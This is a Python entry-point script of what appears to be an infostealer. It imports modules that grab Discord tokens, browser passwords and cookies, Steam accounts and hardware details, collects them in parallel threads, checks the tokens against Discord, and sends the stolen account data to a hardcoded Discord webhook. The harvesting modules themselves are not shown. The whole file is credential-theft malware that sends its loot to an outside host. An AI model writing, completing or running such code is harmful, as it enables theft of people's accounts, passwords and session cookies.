from concurrent.futures import ThreadPoolExecutor

from target.discord import GetDiscordTokens
from target.passwords import GetBrowsersPasswords
from target.cookies import GetBrowsersCookies
from target.steam import GetSteamAccount, GetSteamRemoteClients, GetRememberedMachineJWT
from hardware.Hardware import Hardware

from checks.discord import Discord
from checks.roblox import Roblox

from utils.paths import GetAppDataPaths

import os
import shutil

from webhook.Webhook import Webhook


def processTokens(toucan, web: Webhook, hard: Hardware):
    try:
        user = Discord(toucan).GetUser()
        web.DiscordAccountWebhook(user, hard)
    except ValueError:
        pass


if __name__ == '__main__':
    with ThreadPoolExecutor() as executor:
        tokenfuture = executor.submit(GetDiscordTokens)
        passwordsfuture = executor.submit(GetBrowsersPasswords)
        cookiesfuture = executor.submit(GetBrowsersCookies)
    tokens = tokenfuture.result()
    passwords = passwordsfuture.result()
    cookies = cookiesfuture.result()
    webhook = Webhook("https://discord.com/api/webhooks/1119496924886749224/Zb-HIGPkDOHhJuLMchIcKzhQCymL059fDQAmdnXjdaAgPyGOaboGN-CguVl-uamvZv6o")
    hardware = Hardware()
    with ThreadPoolExecutor() as executor:
        for token in tokens:
            executor.submit(processTokens, token, webhook, hardware)
